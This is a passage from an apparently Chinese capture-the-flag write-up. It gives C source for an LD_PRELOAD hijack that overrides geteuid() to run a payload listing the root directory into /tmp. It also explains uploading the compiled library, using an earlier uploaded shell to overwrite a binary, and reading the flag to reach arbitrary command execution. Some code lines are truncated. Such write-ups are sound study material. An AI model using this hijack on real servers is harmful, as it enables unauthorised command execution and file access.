        return result; 
    } 
  } 
  printf("%s\n",v31); 
  return result; 
} 
int main(int argc, char const *argv[]) 
{ 
    for (int i=20991;i 
#include  
#include  
#include  
void payload() 
{ 
    DIR* dir; 
    struct dirent* ptr; 
    dir = opendir("/"); 
    FILE  *fp; 
    fp=fopen("/tmp/venenoveneno","w"); 
    while ((ptr = readdir(dir)) != NULL) { 
        fprintf(fp,"%s\n",ptr->d_name); 
    } 
    closedir(dir); 
    fflush(fp); 
} 
int geteuid() 
{ 
    if (getenv("LD_PRELOAD") == NULL) { 
        return 0; 
    } 
    unsetenv("LD_PRELOAD"); 
    payload(); 
} 
然后 gcc 编译成 so，然后根据前面的点，我们明白了出题人的思路： 
做到这里，还有题目最后一个坑，就是生成的东西没权限去读，那么怎么办，于是前面传的
shell 用了用处，我们可以利用 copy 命令，去覆盖一个我们之前上传的 bin，于是直接列目
录： 
然后再利用 loadfile 读就可以了： 
发现 flag，然后再进行一次类似操作，利用 fopen 去读文件，最后成功得到 flag： 
编译好so后，
直接上传
利用第一步
的方法生成
bin写进缓存
然后访问执
行任意命令